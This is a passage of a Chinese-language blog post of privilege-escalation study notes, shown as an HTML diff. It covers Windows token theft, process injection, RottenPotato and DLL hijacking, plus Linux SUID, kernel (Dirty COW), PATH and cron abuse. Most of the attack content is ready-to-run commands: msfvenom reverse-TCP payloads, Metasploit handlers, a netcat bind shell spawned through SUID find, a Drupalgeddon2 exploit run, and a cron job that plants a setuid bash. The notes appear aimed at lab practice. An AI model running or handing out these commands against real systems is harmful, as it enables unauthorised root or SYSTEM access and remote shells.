+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows XP Professional SP3和之前版本</span><br><span class="line">Windows Server 2003 SP2和之前的版本</span><br><span class="line">Windows Server 2003 x64和x64 SP2</span><br><span class="line">Windows Server 2003(用于基于ltanium的系统SP2和先前版本)</span><br><span class="line">Windows Server 2008 x32 x64</span><br><span class="line">Windows Server 2008(用于基于ltanium的系统)</span><br><span class="line">Windows Vista SP1和之前的版本</span><br><span class="line">Windows Vista x64 SP1和之前的版本</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220406101923961.png" alt="image-20220406101923961"></p>
+<h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><p>进程注入提权是本地提权方式的一种较为老的安全技术了，利用的是注入进程的所有者实现权限共享机制，这类技术主要利用在windows2008之前操作系统上.所以我们需要学习后续的本地提权更多的手法才能有针对高版本的系统。</p>
+<p>pinjector进程注入工具针对-win2008以前操作系统</p>
+<p><a target="_blank" rel="noopener" href="https://www.tarasco.org/security/Process_Injector/processinjector.zip">下载地址</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-l(查看当前系统的进程)，有PID</span><br><span class="line">pinjector.exe -p [PID] cmd.exe [port]（本地开放一个端口，对应的cmd）</span><br><span class="line">nc.exe [IP] [port]</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后用nc进行监听端口即可实现system权限操作</span><br></pre></td></tr></table></figure>
+
+
+
+<p>pexec64 32进程注入工具针对-win2008及后操作系统-(佛系)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220406105002375.png" alt="image-20220406105002375"></p>
+<h2 id="烂土豆配合令牌窃取提权"><a href="#烂土豆配合令牌窃取提权" class="headerlink" title="烂土豆配合令牌窃取提权"></a>烂土豆配合令牌窃取提权</h2><p>RottenPotato (烂土豆)提权的原理可以简述如下:<br>1.欺骗“NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。<br>2.对这个认证过程使用中间人攻击(NTLM重放)，为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过—系列的Windows API调用实现的。<br>3.模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户(IS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。<br>所以，一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，我发现使用已经建好的账户(就是上面说的用户级账户）去反弹meterpreter然后再去执行EXP的时候会失败，但使用菜刀(IIS服务器权限)反弹meterpreter就会成功。</p>
+<p>烂土豆比热土豆的优点是:<br>1.100%可靠<br>2.(当时)全版本通杀<br>3.立即生效，不用像hot potato那样有时候需要等Windows更新才能使用。<br>总之，我对这个的理解是通过中间人攻击，将COM(NT\[SYSTEM权限）在第二部挑战应答过程中认证的区块改成自己的区块获取SYSTEM令牌，然后利用msf的模仿令牌功能模仿SYSTEM令牌。</p>
+<p>单纯令牌窃取: Web权限或本地提权</p>
+<p>如配合烂土豆提权:Web或数据库等权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPROT=PORT -f exe &gt;shell.exe</span><br><span class="line">上传后用web权限执行文件</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse——tcp</span><br><span class="line">set lhost</span><br><span class="line">set lport</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">upload /root/potato.exe C:\Users\Public</span><br><span class="line">cd C:\\Users\\Public</span><br><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">execute -cH -f ./potato.exe</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Win2012-DLL劫持提权应用配合MSF-Web权限"><a href="#Win2012-DLL劫持提权应用配合MSF-Web权限" class="headerlink" title="Win2012-DLL劫持提权应用配合MSF-Web权限"></a>Win2012-DLL劫持提权应用配合MSF-Web权限</h2><p>原理: Windows程序启动的时候需要DLL。如果这些DLL不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索:</p>
+<p>1、应用程序加载的目录</p>
+<p>2、C:\Windows\System32</p>
+<p>3、C:\Windows\System</p>
+<p>4、C:\Windows<br>5、当前工作目录Current Working Directory,CWD<br>6、在PATH环境变量的目录(先系统后用户)</p>
+<p>过程:信息收集-进程调试(火绒剑)-制作dl并上传-替换dll-启动应用后成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost= lport= -f dll &gt;/opt/xxx.dll</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Win2012-不安全的服务权限配合MSF-本地权限"><a href="#Win2012-不安全的服务权限配合MSF-本地权限" class="headerlink" title="Win2012-不安全的服务权限配合MSF-本地权限"></a>Win2012-不安全的服务权限配合MSF-本地权限</h2><h2 id="Win2012-不带引号服务路径配合MSF-Web-本地权限"><a href="#Win2012-不带引号服务路径配合MSF-Web-本地权限" class="headerlink" title="Win2012-不带引号服务路径配合MSF-Web,本地权限"></a>Win2012-不带引号服务路径配合MSF-Web,本地权限</h2><h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><h2 id="Linux提权自动化脚本利用-4个脚本"><a href="#Linux提权自动化脚本利用-4个脚本" class="headerlink" title="Linux提权自动化脚本利用-4个脚本"></a>Linux提权自动化脚本利用-4个脚本</h2><p>两个信息收集:LinEnum,linuxprivchecker<br>两个漏洞探针: linux-exploit-suggester linux-exploit-suggester2</p>
+<p>信息收集有什么用哦?漏洞探针又有什么用哦?</p>
+<p>LinEnum</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">优先上传/tmp，这是临时文件的保存目录，可执行，可读写</span><br><span class="line">cd /tmp</span><br><span class="line">ls</span><br><span class="line">chmod +x LinEnum.sh</span><br><span class="line">./LinEnum.sh</span><br></pre></td></tr></table></figure>
+
+
+
+<p>linuxprivchecker</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python linuxprivchecker.py</span><br></pre></td></tr></table></figure>
+
+<p>linux-exploit-suggester</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x linux-exploit-suggester.sh</span><br><span class="line">./</span><br></pre></td></tr></table></figure>
+
+<p>linux-exploit-suggester2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl linux-exploit-suggester2.pl</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Linux提权SUID配合脚本演示-Vulhub"><a href="#Linux提权SUID配合脚本演示-Vulhub" class="headerlink" title="Linux提权SUID配合脚本演示-Vulhub"></a>Linux提权SUID配合脚本演示-Vulhub</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看权限ls -al</span><br><span class="line">rw写读x执行</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">探针是否有suid</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">信息搜集</span><br><span class="line">shell后门文件上传到目标网站</span><br><span class="line">用冰蝎连接并反弹shell</span><br><span class="line">用msf接受会话</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">getuid</span><br><span class="line">upload /root/LinEnum.sh /tmp/LinEnum.sh</span><br><span class="line">shell</span><br><span class="line">id</span><br><span class="line">cd /tmp</span><br><span class="line">./LinEnum.sh</span><br><span class="line">chmod +x LinEnum.sh</span><br><span class="line">./LinEnum.sh</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">查看对比有没有</span><br><span class="line">1.nmap</span><br><span class="line">2.vim</span><br><span class="line">3.less</span><br><span class="line">4.more</span><br><span class="line">5.nano</span><br><span class="line">6.cp</span><br><span class="line">7.mv</span><br><span class="line">8.find</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">touch xiaodi</span><br><span class="line">find xiaodi -exec whoami \;</span><br><span class="line">find xiaodi -exec netcat -lvp 5555 -e /bin/sh \;</span><br><span class="line">netcat xx.xx.xx.xx 5555</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Linux提权本地配合内核漏洞演示"><a href="#Linux提权本地配合内核漏洞演示" class="headerlink" title="Linux提权本地配合内核漏洞演示"></a>Linux提权本地配合内核漏洞演示</h2><p>提权过程:连接-获取可利用漏洞-下载或上传EXP-编译EXP-给权限执行-GG</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">pelr linux-exploit-suggester2.pl</span><br><span class="line">gcc 45010.c -o 45010</span><br><span class="line">chmod +x 45010</span><br><span class="line">./45010</span><br><span class="line">id</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Linux提权脏牛内核漏洞演示-linux-exploit-suggester"><a href="#Linux提权脏牛内核漏洞演示-linux-exploit-suggester" class="headerlink" title="Linux提权脏牛内核漏洞演示-linux-exploit-suggester"></a>Linux提权脏牛内核漏洞演示-linux-exploit-suggester</h2><p>vulnhub 靶机-探针目标-CMS漏洞利用-脚本探针提权漏洞-利用内核提权-GG内核漏洞提权过程:寻可用-下exp-上&#x2F;tmp-编译exp-执行(无权限用chmod)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.76.0/24</span><br><span class="line">nmap -p1-65535 192.168.76.141</span><br><span class="line">msfconslole</span><br><span class="line">search drupal </span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">set rhosts 192.168.76.141</span><br><span class="line">set rport 1898</span><br><span class="line">exploit</span><br><span class="line">getuid </span><br><span class="line">uoload /root/linux-exploit-suggester.sh /tmp/1.sh</span><br><span class="line">shell</span><br><span class="line">id</span><br><span class="line">cd/tmp</span><br><span class="line">ls</span><br><span class="line">1.sh</span><br><span class="line">./1.sh</span><br><span class="line">chmod +x 1.sh</span><br><span class="line">./1.sh </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set target 0</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">upload /tmp/40837.cpp /tmp/40837.cpp</span><br><span class="line">shell</span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">./dcow(有了密码了)</span><br><span class="line">su root</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="Linux提权本地环境变量安全"><a href="#Linux提权本地环境变量安全" class="headerlink" title="Linux提权本地环境变量安全"></a>Linux提权本地环境变量安全</h2><p>配合SUID进行环境变量提权-本地用户环境<br>手写调用文件-编译-复制文件-增加环境变量-执行触发</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    getuid(0);</span><br><span class="line">    system(&quot;ps&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gcc demo.c -o shell</span><br><span class="line">cp /bin/sh /tmp/ps</span><br><span class="line">ps（进程）</span><br><span class="line">./ps(sh文件)</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">echo $PATH(输出环境变量多了一个tmp)</span><br><span class="line">ps(调用的tmp里的ps也就是sh)</span><br><span class="line">./shell</span><br><span class="line">id</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Linux提权本地定时任务安全"><a href="#Linux提权本地定时任务安全" class="headerlink" title="Linux提权本地定时任务安全"></a>Linux提权本地定时任务安全</h2><h3 id="路径问题"><a href="#路径问题" class="headerlink" title="路径问题"></a>路径问题</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /ect/crontab</span><br><span class="line">echo &#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27; &gt; /home/xiaodi/test.sh</span><br><span class="line">chmod +x /home/xiaodi/test.sh</span><br><span class="line">/tmp/bash</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>原创技术分享，您的支持将鼓励我继续创作</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="Spring 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Spring 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+	  
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag"># 权限提升</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/04/03/%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86/" rel="prev" title="面试题整理">
+      <i class="fa fa-chevron-left"></i> 面试题整理
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Win-%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8A-AT-amp-SC-amp-PS-%E6%8F%90%E6%9D%83"><span class="nav-number">1.</span> <span class="nav-text">Win 溢出漏洞及 AT&amp;SC&amp;PS 提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.1.</span> <span class="nav-text">基础知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%EF%BC%9F%E6%BC%8F%E6%B4%9E%E5%9C%A8%E5%93%AA%E9%87%8C%E6%89%BE%EF%BC%9F"><span class="nav-number">1.2.</span> <span class="nav-text">如何判断溢出漏洞？漏洞在哪里找？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E4%BD%BF%E7%94%A8%E5%93%AA%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.3.</span> <span class="nav-text">如何判断使用哪种数据库提权?数据库提权利用条件?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E5%8F%AF%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%83%85%E5%86%B5-AT-amp-SC-amp-PS%E5%91%BD%E4%BB%A4%E9%80%82%E7%94%A8%E7%8E%AF%E5%A2%83"><span class="nav-number">1.4.</span> <span class="nav-text">如何判断本地环境可利用漏洞情况?AT&amp;SC&amp;PS命令适用环境?</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MY-amp-MS-amp-ORA-%E7%AD%89-SQL-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="nav-number">2.</span> <span class="nav-text">MY&amp;MS&amp;ORA 等 SQL 数据库提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E6%BC%94%E7%A4%BA-%E8%84%9A%E6%9C%AC-amp-MSF"><span class="nav-number">2.1.</span> <span class="nav-text">Mysql数据库提权演示-脚本&amp;MSF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#UDF%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%88%E5%9F%BA%E4%BA%8Emysql%E8%B0%83%E7%94%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%EF%BC%89"><span class="nav-number">2.1.1.</span> <span class="nav-text">UDF提权知识点（基于mysql调用命令执行函数）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MOF%E7%9F%A5%E8%AF%86%E7%82%B9-%E5%9F%BA%E4%BA%8EMYSQL%E7%89%B9%E6%80%A7%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="nav-number">2.1.2.</span> <span class="nav-text">MOF知识点:(基于MYSQL特性的安全问题)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E7%9F%A5%E8%AF%86%E7%82%B9-%E5%9F%BA%E4%BA%8E%E9%85%8D%E5%90%88%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="nav-number">2.1.3.</span> <span class="nav-text">启动项知识点:(基于配合操作系统自启动)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Win%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">Win提权方法总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="nav-number">3.1.</span> <span class="nav-text">内核溢出漏洞提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E6%8F%90%E6%9D%83"><span class="nav-number">3.2.</span> <span class="nav-text">系统配置错误提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="nav-number">3.2.1.</span> <span class="nav-text">系统服务权限配置错误</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E4%BF%A1%E4%BB%BB%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.2.2.</span> <span class="nav-text">可信任服务路径漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">3.2.3.</span> <span class="nav-text">计划任务</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5%E9%A6%96%E9%80%89%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="nav-number">3.3.</span> <span class="nav-text">组策略首选项提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87UAC%E6%8F%90%E6%9D%83"><span class="nav-number">3.4.</span> <span class="nav-text">绕过UAC提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="nav-number">3.5.</span> <span class="nav-text">令牌窃取</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B"><span class="nav-number">3.5.1.</span> <span class="nav-text">*实例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">3.6.</span> <span class="nav-text">进程注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%83%82%E5%9C%9F%E8%B1%86%E9%85%8D%E5%90%88%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E6%8F%90%E6%9D%83"><span class="nav-number">3.7.</span> <span class="nav-text">烂土豆配合令牌窃取提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Win2012-DLL%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83%E5%BA%94%E7%94%A8%E9%85%8D%E5%90%88MSF-Web%E6%9D%83%E9%99%90"><span class="nav-number">3.8.</span> <span class="nav-text">Win2012-DLL劫持提权应用配合MSF-Web权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Win2012-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%85%8D%E5%90%88MSF-%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90"><span class="nav-number">3.9.</span> <span class="nav-text">Win2012-不安全的服务权限配合MSF-本地权限</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Win2012-%E4%B8%8D%E5%B8%A6%E5%BC%95%E5%8F%B7%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%E9%85%8D%E5%90%88MSF-Web-%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90"><span class="nav-number">3.10.</span> <span class="nav-text">Win2012-不带引号服务路径配合MSF-Web,本地权限</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">Linux提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux%E6%8F%90%E6%9D%83%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC%E5%88%A9%E7%94%A8-4%E4%B8%AA%E8%84%9A%E6%9C%AC"><span class="nav-number">4.1.</span> <span class="nav-text">Linux提权自动化脚本利用-4个脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux%E6%8F%90%E6%9D%83SUID%E9%85%8D%E5%90%88%E8%84%9A%E6%9C%AC%E6%BC%94%E7%A4%BA-Vulhub"><span class="nav-number">4.2.</span> <span class="nav-text">Linux提权SUID配合脚本演示-Vulhub</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E9%85%8D%E5%90%88%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA"><span class="nav-number">4.3.</span> <span class="nav-text">Linux提权本地配合内核漏洞演示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux%E6%8F%90%E6%9D%83%E8%84%8F%E7%89%9B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA-linux-exploit-suggester"><span class="nav-number">4.4.</span> <span class="nav-text">Linux提权脏牛内核漏洞演示-linux-exploit-suggester</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux%E6%8F%90%E6%9D%83%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%AE%89%E5%85%A8"><span class="nav-number">4.5.</span> <span class="nav-text">Linux提权本地环境变量安全</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" 